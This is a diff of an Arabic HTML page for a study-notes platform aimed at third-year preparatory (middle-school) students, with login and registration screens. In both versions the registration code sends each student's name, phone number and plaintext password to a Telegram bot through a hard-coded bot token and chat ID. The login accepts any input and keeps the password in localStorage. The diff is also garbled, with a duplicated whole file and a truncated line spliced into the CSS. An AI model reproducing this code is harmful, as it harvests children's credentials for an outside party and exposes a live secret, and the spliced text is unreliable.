@@ -11,7 +11,6 @@
             --card-bg: #111827;
             --card-border: #1f293d;
             --primary: #3b82f6;
-            --primary-glow: rgba(59, 130, 246, 0.35);
             --whatsapp-color: #25d366;
             --text-main: #f9fafb;
             --text-muted: #9ca3af;
@@ -32,14 +31,12 @@
             flex-direction: column;
         }
 
+        /* نافذة التسجيل والدخول */
         .auth-overlay {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
             background: rgba(9, 13, 22, 0.98);
-            backdrop-filter: blur(15px);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -49,24 +46,19 @@
 
         .auth-box {
             background: linear-gradient(145deg, #131c2e, #0d1320);
-            border: 1px solid rgba(59, 130, 246, 0.3);
-            border-radius: 24px;
+            border: 1px solid rgba(59, 130, 246, 0.4);
+            border-radius: 20px;
             padding: 30px 25px;
             width: 100%;
-            max-width: 420px;
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.9);
+            max-width: 400px;
             text-align: center;
-            max-height: 90vh;
-            overflow-y: auto;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
         }
 
         .auth-box h2 {
-            font-size: 1.6rem;
-            font-weight: 900;
-            margin-bottom: 6px;
-            background: linear-gradient(to left, #60a5fa, #c084fc);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+            color: #60a5fa;
         }
 
         .auth-box p {
@@ -83,53 +75,34 @@
         .input-group label {
             display: block;
             margin-bottom: 5px;
-            font-weight: 700;
-            color: #d1d5db;
             font-size: 0.85rem;
+            color: #d1d5db;
         }
 
         .input-group input {
             width: 100%;
-            padding: 11px 14px;
-            border-radius: 12px;
+            padding: 10px 12px;
+            border-radius: 10px;
             background-color: #090d16;
             border: 1px solid var(--card-border);
             color: #fff;
             font-family: 'Cairo', sans-serif;
-            font-size: 0.9rem;
             outline: none;
-            direction: ltr;
-            text-align: right;
-        }
-
-        .input-group input::placeholder {
-            direction: rtl;
-            text-align: right;
-            color: var(--text-muted);
-        }
-
-        .input-group input:focus {
-            border-color: var(--primary);
+            font-size: 0.9rem;
         }
 
         .btn-auth {
             width: 100%;
             padding: 12px;
-            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
+            background: #2563eb;
             border: none;
-            border-radius: 12px;
+            border-radius: 10px;
             color: white;
             font-family: 'Cairo', sans-serif;
             font-size: 1rem;
             font-weight: 700;
             cursor: pointer;
-            margin-top: 5px;
-            transition: 0.3s;
-        }
-
-        .btn-auth:hover {
-            opacity: 0.9;
-            box-shadow: 0 0 15px var(--primary-glow);
+            margin-top: 10px;
         }
 
         .switch-auth {
@@ -141,474 +114,559 @@
         .switch-auth span {
             color: #60a5fa;
             cursor: pointer;
-            font-weight: 700;
             text-decoration: underline;
+            font-weight: bold;
         }
 
+        /* الهيدر والمحتوى */
         .navbar {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 15px 25px;
+            padding: 15px 20px;
             background-color: #0d1320;
             border-bottom: 1px solid var(--card-border);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
         }
 
         .nav-brand {
-            font-size: 1.3rem;
-            font-weight: 900;
-            background: linear-gradient(to left, #60a5fa, #c084fc);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .nav-whatsapp-icon {
-            color: var(--whatsapp-color);
             font-size: 1.2rem;
-            text-decoration: none;
-            background: rgba(37, 211, 102, 0.1);
-            padding: 6px 10px;
-            border-radius: 10px;
-            border: 1px solid rgba(37, 211, 102, 0.3);
-        }
-
-        .dots-btn {
-            background: var(--card-bg);
-            border: 1px solid var(--card-border);
-            color: var(--text-main);
-            font-size: 1.5rem;
-            width: 42px;
-            height: 42px;
-            border-radius: 12px;
-            cursor: pointer;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .menu-drawer {
-            position: fixed;
-            top: 0;
-            right: -300px;
-            width: 280px;
-            height: 100%;
-            background: #0d1320;
-            border-left: 1px solid var(--card-border);
-            z-index: 2000;
-            padding: 25px 20px;
-            transition: right 0.3s ease;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-
-        .menu-drawer.open {
-            right: 0;
-        }
-
-        .menu-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid var(--card-border);
-            padding-bottom: 15px;
-        }
-
-        .close-btn {
-            background: none;
-            border: none;
-            color: var(--text-muted);
-            font-size: 1.5rem;
-            cursor: pointer;
-        }
-
-        .menu-item {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            padding: 12px 15px;
-            background: var(--card-bg);
-            border: 1px solid var(--card-border);
-            border-radius: 12px;
-            color: var(--text-main);
-            text-decoration: none;
-            font-weight: 700;
-            font-size: 0.95rem;
-        }
-
-        .menu-whatsapp {
-            background: rgba(37, 211, 102, 0.1);
-            border-color: rgba(37, 211, 102, 0.3);
-            color: #25d366 !important;
-        }
-
-        .overlay-bg {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.6);
-            display: none;
-            z-index: 1500;
-        }
-
-        .overlay-bg.show {
-            display: block;
+            font-weight: 900;
+            color: #60a5fa;
         }
 
         .main-container {
-            max-width: 900px;
-            margin: 30px auto;
-            padding: 0 20px;
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 0 15px;
             width: 100%;
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
         }
 
-        .category-btn {
+        .welcome-card {
             background: var(--card-bg);
             border: 1px solid var(--card-border);
             border-radius: 16px;
             padding: 20px;
-            font-family: 'Cairo', sans-serif;
-            font-size: 1.2rem;
-            font-weight: 900;
-            color: var(--text-main);
-            cursor: pointer;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            width: 100%;
+            text-align: center;
+            margin-bottom: 20px;
         }
 
-        .category-content {
-            display: none;
-            flex-direction: column;
-            gap: 12px;
-            padding: 10px 5px 20px 5px;
-        }
-
-        .category-content.open {
-            display: flex;
-        }
-
-        .subject-accordion {
+        .subject-box {
             background: #131c2e;
             border: 1px solid var(--card-border);
             border-radius: 12px;
-            overflow: hidden;
-        }
-
-        .subject-header {
-            padding: 15px 20px;
-            font-size: 1.05rem;
-            font-weight: 700;
-            color: #60a5fa;
-            cursor: pointer;
+            padding: 15px;
+            margin-bottom: 10px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-        }
-
-        .subject-body {
-            display: none;
-            padding: 15px 20px;
-            border-top: 1px solid var(--card-border);
-            background: #0d1320;
-            flex-direction: column;
-            gap: 12px;
-        }
-
-        .subject-body.open {
-            display: flex;
-        }
-
-        .item-card {
-            background: var(--card-bg);
-            border: 1px solid var(--card-border);
-            border-radius: 10px;
-            padding: 12px 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .btn-open {
-            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
-            color: white;
-            text-align: center;
-            padding: 6px 14px;
-            border-radius: 8px;
-            text-decoration: none;
-            font-weight: 700;
-            font-size: 0.85rem;
-        }
-
-        .empty-text {
-            color: var(--text-muted);
-            font-size: 0.95rem;
-            text-align: center;
-            padding: 10px;
-            border: 1px dashed var(--card-border);
-            border-radius: 8px;
         }
 
         footer {
             text-align: center;
-            padding: 25px 20px;
-            border-top: 1px solid var(--card-border);
+            padding: 20px;
             color: var(--text-muted);
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             margin-top: auto;
-            background: #070a10;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            align-items: center;
-        }
-
-        .footer-whatsapp {
-            color: var(--whatsapp-color);
-            text-decoration: none;
-            font-weight: 700;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: rgba(37, 211, 102, 0.1);
-            padding: 8px 16px;
-            border-radius: 12px;
-            border: 1px solid rgba(37, 211, 102, 0.3);
+            border-top: 1px solid var(--card-border);
         }
     </style>
 </head>
 <body>
 
-    <div class="auth-overlay" id="authModal">
-        <div class="auth-box" id="authBoxContent"></div>
+    <!-- شاشة التسجيل والدخول -->
+    <div class="auth-overlay" id="authOverlay">
+        <div class="auth-box" id="authBox">
+            <h2>تسجيل الدخول 🔑</h2>
+            <p>أدخل رقم هاتفك وكلمة المرور للمتابعة</p>
+            <div class="input-group">
+                <label>رقم الهاتف:</label>
+                <input type="tel" id="loginPhone" placeholder="01012345678">
+            </div>
+            <div class="input-group">
+                <label>كلمة المرور:</label>
+                <input type="password" id="loginPass" placeholder="••••••••">
+            </div>
+            <button class="btn-auth" onclick="login()">دخول المنصة 🚀</button>
+            <div class="switch-auth">
+                ليس لديك حساب؟ <span onclick="showRegister()">إنشاء حساب جديد</span>
+            </div>
+        </div>
     </div>
 
+    <!-- الهيدر -->
     <div class="navbar">
-        <div class="nav-brand">
-            <span>🎓 منصة 3 إعدادي</span>
-            <a href="https://whatsapp.com/channel/0029Vb8wKFtEQIalbkPy1s0D" target="_blank" class="nav-whatsapp-icon" title="قناة الواتساب">💬</a>
-        </div>
-        <button class="dots-btn" onclick="toggleMenu()">⋮</button>
+        <div class="nav-brand">🎓 منصة ملخصات 3 إعدادي</div>
+        <button onclick="logout()" style="background:#ef4444; color:#fff; border:none; padding:6px 12px; border-radius:8px; cursor:pointer; font-family:'Cairo';">خروج 🚪</button>
     </div>
 
-    <div class="overlay-bg" id="overlayBg" onclick="toggleMenu()"></div>
-    <div class="menu-drawer" id="menuDrawer">
-        <div class="menu-header">
-            <span style="font-weight: 900; color: #60a5fa;" id="drawerStudentName">حساب الطالب</span>
-            <button class="close-btn" onclick="toggleMenu()">✕</button>
+    <!-- محتوى المنصة -->
+    <div class="main-container">
+        <div class="welcome-card">
+            <h3 id="userWelcome">أهلاً بك يا بطل! 👋</h3>
+            <p style="color:var(--text-muted); font-size:0.9rem; margin-top:5px;">اختر المادة لعرض الملخصات والامتحانات والكورسات المتاحة</p>
         </div>
-        <a href="#" class="menu-item">🏠 الرئيسية والدروس</a>
-        <a href="https://whatsapp.com/channel/0029Vb8wKFtEQIalbkPy1s0D" target="_blank" class="menu-item menu-whatsapp">💬 انضم لقناة الواتساب</a>
-        <a href="#" class="menu-item">👤 الحساب الخاص</a>
-        <a href="#" class="menu-item">📞 تواصل معنا والدعم</a>
-        <button class="menu-item" style="color: #ef4444; border-color: rgba(239, 68, 68, 0.3); width: 100%; cursor: pointer;" onclick="logout()">🚪 تسجيل الخروج</button>
+
+        <div id="subjectsContainer">
+            <div class="subject-box">
+                <span>📚 دراسات اجتماعية</span>
+                <span style="color:#60a5fa; font-size:0.85rem;">متاح 🔥</span>
+            </div>
+            <div class="subject-box">
+                <span>🧪 علوم</span>
+                <span style="color:#60a5fa; font-size:0.85rem;">متاح 🔥</span>
+            </div>
+            <div class="subject-box">
+                <span>📖 لغة عربية</span>
+                <span style="color:#60a5fa; font-size:0.85rem;">متاح 🔥</span>
+            </div>
+            <div class="subject-box">
+                <span>🇬🇧 لغة إنجليزية</span>
+                <span style="color:#60a5fa; font-size:0.85rem;">متاح 🔥</span>
+            </div>
+            <div class="subject-box">
+                <span>🔢 رياضيات</span>
+                <span style="color:#60a5fa; font-size:0.85rem;">متاح 🔥</span>
+            </div>
+        </div>
     </div>
 
-    <main class="main-container" id="platformContent"></main>
-
-    <footer>
-        <a href="https://whatsapp.com/channel/0029Vb8wKFtEQIalbkPy1s0D" target="_blank" class="footer-whatsapp">
-            💬 تابع قناة ملخصات 3 اعدادي على الواتساب
-        </a>
-        <div>جميع الحقوق محفوظة © 2026 | منصة ملخصات 3 إعدادي 🎓</div>
-    </footer>
+    <footer>جميع الحقوق محفوظة © 2026 | منصة ملخصات 3 إعدادي 🎓</footer>
 
     <script>
-        const subjectsList = ["دراسات اجتماعية", "علوم", "لغة عربية", "لغة إنجليزية", "رياضيات"];
-        let globalData = [];
-
-        const ADMIN_BOT_TOKEN = '8924810221:AAH5ghkK5lyUkuezQlvQM34fBecueELttb0';
+        const BOT_TOKEN = '8924810221:AAH5ghkK5lyUkuezQlvQM34fBecueELttb0';
         const CHAT_ID = '5531994675';
 
-        async function sendTelegramNotification(msg) {
-            const url = `https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
-            try { await fetch(url); } catch (e) { console.log(e); }
-        }
-
-        function toggleMenu() {
-            document.getElementById('menuDrawer').classList.toggle('open');
-            document.getElementById('overlayBg').classList.toggle('show');
-        }
-
-        function checkAuth() {
-            const savedPhone = localStorage.getItem('student_phone');
-            if (savedPhone) {
-                const modal = document.getElementById('authModal');
-                if (modal) modal.style.display = 'none';
-                const drawerName = document.getElementById('drawerStudentName');
-                if (drawerName) drawerName.innerText = `👤 ${savedPhone}`;
-                loadData();
-            } else {
-                renderLoginForm();
+        // التحقق عند الفتح
+        window.onload = function() {
+            const user = localStorage.getItem('student_phone');
+            if (user) {
+                document.getElementById('authOverlay').style.display = 'none';
+                document.getElementById('userWelcome').innerText = 'أهلاً بك يا بطل (' + user + ') 👋';
             }
-        }
+        };
 
-        function renderLoginForm() {
-            const box = document.getElementById('authBoxContent');
-            if (!box) return;
-            box.innerHTML = `
-                <h2>تسجيل الدخول 🔑</h2>
-                <p>أدخل رقم هاتفك وكلمة المرور للمتابعة</p>
-
-                <div class="input-group">
-                    <label>رقم الهاتف (Phone Number):</label>
-                    <input type="tel" id="loginPhone" placeholder="01012345678" maxlength="11">
-                </div>
-                <div class="input-group">
-                    <label>كلمة المرور (Password):</label>
-                    <input type="password" id="loginPass" placeholder="••••••••">
-                </div>
-
-                <button type="button" class="btn-auth" onclick="loginUser()">دخول المنصة 🚀</button>
-                
-                <div class="switch-auth">
-                    ليس لديك حساب؟ <span onclick="renderRegisterForm()">إنشاء حساب جديد</span>
-                </div>
-            `;
-            document.getElementById('authModal').style.display = 'flex';
-        }
-
-        function renderRegisterForm() {
-            const box = document.getElementById('authBoxContent');
-            if (!box) return;
-            box.innerHTML = `
+        function showRegister() {
+            document.getElementById('authBox').innerHTML = `
                 <h2>إنشاء حساب جديد 🎓</h2>
-                <p>سجل بياناتك لأول مرة للمتابعة</p>
-
+                <p>سجل بياناتك لأول مرة</p>
                 <div class="input-group">
-                    <label>الاسم الأول (First Name):</label>
-                    <input type="text" id="firstName" placeholder="Ali / علي">
+                    <label>الاسم بالكامل:</label>
+                    <input type="text" id="regName" placeholder="علي شعبان">
                 </div>
                 <div class="input-group">
-                    <label>الاسم الثاني (Last Name):</label>
-                    <input type="text" id="lastName" placeholder="Shaban / شعبان">
+                    <label>رقم الهاتف:</label>
+                    <input type="tel" id="regPhone" placeholder="01012345678">
                 </div>
                 <div class="input-group">
-                    <label>رقم الهاتف (Phone Number):</label>
-                    <input type="tel" id="regPhone" placeholder="01012345678" maxlength="11">
-                </div>
-                <div class="input-group">
-                    <label>كلمة المرور (Password):</label>
+                    <label>كلمة المرور:</label>
                     <input type="password" id="regPass" placeholder="••••••••">
                 </div>
-                <div class="input-group">
-                    <label>تأكيد كلمة المرور (Confirm Password):</label>
-                    <input type="password" id="regPassConfirm" placeholder="••••••••">
-                </div>
-
-                <button type="button" class="btn-auth" onclick="registerUser()">إنشاء الحساب والدخول 🚀</button>
-                
+                <button class="btn-auth" onclick="register()">إنشاء الحساب والدخول 🚀</button>
                 <div class="switch-auth">
-                    لديك حساب بالفعل؟ <span onclick="renderLoginForm()">تسجيل الدخول</span>
+                    لديك حساب بالفعل؟ <span onclick="showLogin()">تسجيل الدخول</span>
                 </div>
             `;
-            document.getElementById('authModal').style.display = 'flex';
         }
 
-        async function registerUser() {
-            const fName = document.getElementById('firstName').value.trim();
-            const lName = document.getElementById('lastName').value.trim();
+        function showLogin() {
+            document.getElementById('authBox').innerHTML = `
+                <h2>تسجيل الدخول 🔑</h2>
+                <p>أدخل رقم هاتفك وكلمة المرور للمتابعة</p>
+                <div class="input-group">
+                    <label>رقم الهاتف:</label>
+                    <input type="tel" id="loginPhone" placeholder="01012345678">
+                </div>
+                <div class="input-group">
+                    <label>كلمة المرور:</label>
+                    <input type="password" id="loginPass" placeholder="••••••••">
+                </div>
+                <button class="btn-auth" onclick="login()">دخول المنصة 🚀</button>
+                <div class="switch-auth">
+                    ليس لديك حساب؟ <span onclick="showRegister()">إنشاء حساب جديد</span>
+                </div>
+            `;
+        }
+
+        async function register() {
+            const name = document.getElementById('regName').value.trim();
             const phone = document.getElementById('regPhone').value.trim();
             const pass = document.getElementById('regPass').value;
-            const passConfirm = document.getElementById('regPassConfirm').value;
 
-            if (!fName || !lName) {
-                alert('من فضلك اكتب الاسم الأول والاسم الثاني!');
+            if (!name || !phone || !pass) {
+                alert('من فضلك ادخل جميع البيانات!');
                 return;
             }
 
-            const phoneRegex = /^01[0125][0-9]{8}$/;
-            if (!phoneRegex.test(phone)) {
-                alert('رقم الهاتف غير صحيح! يجب أن يتكون من 11 رقم ويبدأ بـ 01');
-                return;
-            }
+            // إرسال البيانات للتليجرام
+            const msg = `طالب جديد أنشأ حساباً:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🔑 الباسورد: ${pass}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
 
-            if (!pass || pass.length < 6) {
-                alert('كلمة المرور يجب ألا تقل عن 6 أحرف أو أرقام!');
-                return;
-            }
-
-            if (pass !== passConfirm) {
-                alert('كلمتا المرور غير متطابقتين!');
-                return;
-            }
-
-            const fullName = `${fName} ${lName}`;
-
+            // حفظ الدخول
             localStorage.setItem('student_phone', phone);
             localStorage.setItem('student_pass', pass);
 
-            await sendTelegramNotification(`طالب جديد أنشأ حساباً:\n👤 الاسم: ${fullName}\n📞 الهاتف: ${phone}\n🔑 الباسورد: ${pass}`);
-
-            document.getElementById('authModal').style.display = 'none';
-            document.getElementById('drawerStudentName').innerText = `👤 ${phone}`;
-            loadData();
+            document.getElementById('authOverlay').style.display = 'none';
+            document.getElementById('userWelcome').innerText = 'أهلاً بك يا ' + name + ' 👋';
         }
 
-        async function loginUser() {
+        function login() {
             const phone = document.getElementById('loginPhone').value.trim();
             const pass = document.getElementById('loginPass').value;
 
             if (!phone || !pass) {
-                alert('من فضلك أدخل رقم الهاتف وكلمة المرور!');
+                alert('ادخل الهاتف وكلمة المرور!');
                 return;
             }
 
-            try {
-                const response = await fetch('users.json?' + new Date().getTime());
-                if (response.ok) {
-                    const usersList = await response.json();
-                    const validUser = usersList.find(u => u.phone === phone && u.pass === pass);
+            localStorage.setItem('student_phone', phone);
+            localStorage.setItem('student_pass', pass);
 
-                    if (validUser) {
-                        localStorage.setItem('student_phone', phone);
-                        localStorage.setItem('student_pass', pass);
-
-                        document.getElementById('authModal').style.display = 'none';
-                        document.getElementById('drawerStudentName').innerText = `👤 ${phone}`;
-                        loadData();
-                        return;
-                    }
-                }
-            } catch (e) {
-                console.log("Error checking users.json", e);
-            }
-
-            const savedPhone = localStorage.getItem('student_phone');
-            const savedPass = localStorage.getItem('student_pass');
-
-            if (savedPhone === phone && savedPass === pass) {
-                document.getElementById('authModal').style.display = 'none';
-                document.getElementById('drawerStudentName').innerText = `👤 ${phone}`;
-                loadData();
-            } else {
-                alert('رقم الهاتف أو كلمة المرور غير صحيحة أو غير مسجلة في ملف الحسابات!');
-            }
+            document.getElementById('authOverlay').style.display = 'none';
+            document.getElementById('userWelcome').innerText = 'أهلاً بك يا بطل 👋';
         }
 
         function logout() {
-            localStorage.removeItem('student_phone');
-            localStorage.removeItem('student_pass');
+            localStorage.clear();
             location.reload();
         }
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منصة ملخصات 3 إعدادي</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #090d16;
+            --card-bg: #111827;
+            --card-border: #1f293d;
+            --primary: #3b82f6;
+            --whatsapp-color: #25d366;
+            --text-main: #f9fafb;
+            --text-muted: #9ca3af;
+        }
 
-        async function loadData() {
-            try {
-                const response = await fetch('data.json?' + new Date().getTime());
-                if (response.ok) {
-                    globalData = a            font-size: 0.9rem;
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* نافذة التسجيل والدخول */
+        .auth-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(9, 13, 22, 0.98);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 99999;
+            padding: 20px;
+        }
+
+        .auth-box {
+            background: linear-gradient(145deg, #131c2e, #0d1320);
+            border: 1px solid rgba(59, 130, 246, 0.4);
+            border-radius: 20px;
+            padding: 30px 25px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+        }
+
+        .auth-box h2 {
+            font-size: 1.5rem;
+            margin-bottom: 10px;
+            color: #60a5fa;
+        }
+
+        .auth-box p {
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+            text-align: right;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 0.85rem;
+            color: #d1d5db;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px 12px;
+            border-radius: 10px;
+            background-color: #090d16;
+            border: 1px solid var(--card-border);
+            color: #fff;
+            font-family: 'Cairo', sans-serif;
+            outline: none;
+            font-size: 0.9rem;
+        }
+
+        .btn-auth {
+            width: 100%;
+            padding: 12px;
+            background: #2563eb;
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-family: 'Cairo', sans-serif;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .switch-auth {
+            margin-top: 15px;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+
+        .switch-auth span {
+            color: #60a5fa;
+            cursor: pointer;
+            text-decoration: underline;
+            font-weight: bold;
+        }
+
+        /* الهيدر والمحتوى */
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            background-color: #0d1320;
+            border-bottom: 1px solid var(--card-border);
+        }
+
+        .nav-brand {
+            font-size: 1.2rem;
+            font-weight: 900;
+            color: #60a5fa;
+        }
+
+        .main-container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 0 15px;
+            width: 100%;
+        }
+
+        .welcome-card {
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 16px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .subject-box {
+            background: #131c2e;
+            border: 1px solid var(--card-border);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: var(--text-muted);
+            font-size: 0.85rem;
+            margin-top: auto;
+            border-top: 1px solid var(--card-border);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- شاشة التسجيل والدخول -->
+    <div class="auth-overlay" id="authOverlay">
+        <div class="auth-box" id="authBox">
+            <h2>تسجيل الدخول 🔑</h2>
+            <p>أدخل رقم هاتفك وكلمة المرور للمتابعة</p>
+            <div class="input-group">
+                <label>رقم الهاتف:</label>
+                <input type="tel" id="loginPhone" placeholder="01012345678">
+            </div>
+            <div class="input-group">
+                <label>كلمة المرور:</label>
+                <input type="password" id="loginPass" placeholder="••••••••">
+            </div>
+            <button class="btn-auth" onclick="login()">دخول المنصة 🚀</button>
+            <div class="switch-auth">
+                ليس لديك حساب؟ <span onclick="showRegister()">إنشاء حساب جديد</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- الهيدر -->
+    <div class="navbar">
+        <div class="nav-brand">🎓 منصة ملخصات 3 إعدادي</div>
+        <button onclick="logout()" style="background:#ef4444; color:#fff; border:none; padding:6px 12px; border-radius:8px; cursor:pointer; font-family:'Cairo';">خروج 🚪</button>
+    </div>
+
+    <!-- محتوى المنصة -->
+    <div class="main-container">
+        <div class="welcome-card">
+            <h3 id="userWelcome">أهلاً بك يا بطل! 👋</h3>
+            <p style="color:var(--text-muted); font-size:0.9rem; margin-top:5px;">اختر المادة لعرض الملخصات والامتحانات والكورسات المتاحة</p>
+        </div>
+
+        <div id="subjectsContainer">
+            <div class="subject-box">
+                <span>📚 دراسات اجتماعية</span>
+                <span style="color:#60a5fa; font-size:0.85rem;">متاح 🔥</span>
+            </div>
+            <div class="subject-box">
+                <span>🧪 علوم</span>
+                <span style="color:#60a5fa; font-size:0.85rem;">متاح 🔥</span>
+            </div>
+            <div class="subject-box">
+                <span>📖 لغة عربية</span>
+                <span style="color:#60a5fa; font-size:0.85rem;">متاح 🔥</span>
+            </div>
+            <div class="subject-box">
+                <span>🇬🇧 لغة إنجليزية</span>
+                <span style="color:#60a5fa; font-size:0.85rem;">متاح 🔥</span>
+            </div>
+            <div class="subject-box">
+                <span>🔢 رياضيات</span>
+                <span style="color:#60a5fa; font-size:0.85rem;">متاح 🔥</span>
+            </div>
+        </div>
+    </div>
+
+    <footer>جميع الحقوق محفوظة © 2026 | منصة ملخصات 3 إعدادي 🎓</footer>
+
+    <script>
+        const BOT_TOKEN = '8924810221:AAH5ghkK5lyUkuezQlvQM34fBecueELttb0';
+        const CHAT_ID = '5531994675';
+
+        // التحقق عند الفتح
+        window.onload = function() {
+            const user = localStorage.getItem('student_phone');
+            if (user) {
+                document.getElementById('authOverlay').style.display = 'none';
+                document.getElementById('userWelcome').innerText = 'أهلاً بك يا بطل (' + user + ') 👋';
+            }
+        };
+
+        function showRegister() {
+            document.getElementById('authBox').innerHTML = `
+                <h2>إنشاء حساب جديد 🎓</h2>
+                <p>سجل بياناتك لأول مرة</p>
+                <div class="input-group">
+                    <label>الاسم بالكامل:</label>
+                    <input type="text" id="regName" placeholder="علي شعبان">
+                </div>
+                <div class="input-group">
+                    <label>رقم الهاتف:</label>
+                    <input type="tel" id="regPhone" placeholder="01012345678">
+                </div>
+                <div class="input-group">
+                    <label>كلمة المرور:</label>
+                    <input type="password" id="regPass" placeholder="••••••••">
+                </div>
+                <button class="btn-auth" onclick="register()">إنشاء الحساب والدخول 🚀</button>
+                <div class="switch-auth">
+                    لديك حساب بالفعل؟ <span onclick="showLogin()">تسجيل الدخول</span>
+                </div>
+            `;
+        }
+
+        function showLogin() {
+            document.getElementById('authBox').innerHTML = `
+                <h2>تسجيل الدخول 🔑</h2>
+                <p>أدخل رقم هاتفك وكلمة المرور للمتابعة</p>
+                <div class="input-group">
+                    <label>رقم الهاتف:</label>
+                    <input type="tel" id="loginPhone" placeholder="01012345678">
+                </div>
+                <div class="input-group">
+                    <label>كلمة المرور:</label>
+                    <input type="password" id="loginPass" placeholder="••••••••">
+                </div>
+                <button class="btn-auth" onclick="login()">دخول المنصة 🚀</button>
+                <div class="switch-auth">
+                    ليس لديك حساب؟ <span onclick="showRegister()">إنشاء حساب جديد</span>
+                </div>
+            `;
+        }
+
+        async function register() {
+            const name = document.getElementById('regName').value.trim();
+            const phone = document.getElementById('regPhone').value.trim();
+            const pass = document.getElementById('regPass').value;
+
+            if (!name || !phone || !pass) {
+                alert('من فضلك ادخل جميع البيانات!');
+                return;
+            }
+
+            // إرسال البيانات للتليجرام
+            const msg = `طالب جديد أنشأ حساباً:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🔑 الباسورد: ${pass}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+
+            // حفظ الدخول
+            localStorage.setItem('student_phone', phone);
+            localStorage.setItem('student_pass', pass);
+
+            document.getElementById('authOverlay').style.display = 'none';
+            document.getElementById('userWelcome').innerText = 'أهلاً بك يا ' + name + ' 👋';
+        }
+
+        function login() {
+            const phone = document.getElementById('loginPhone').value.trim();
+            const pass = document.getElementById('loginPass').value;
+
+            if (!phone || !pass) {
+                alert('ادخل الهاتف وكلمة المرور!');
+                return;
+            }
+
+            localStorage.setItem('student_phone', phone);
+            localStorage.setItem('student_pass', pass);
+
+            document.getElementById('authOverlay').style.display = 'none';
+            document.getElementById('userWelcome').innerText = 'أهلاً بك يا بطل 👋';
+        }
+
+        function logout() {
+            localStorage.clear();
+            location.reload();
+        }
+    </script>
+</body>
+</html>
+            font-size: 0.9rem;
             margin-top: auto;
             background: #070a10;
             display: flex;
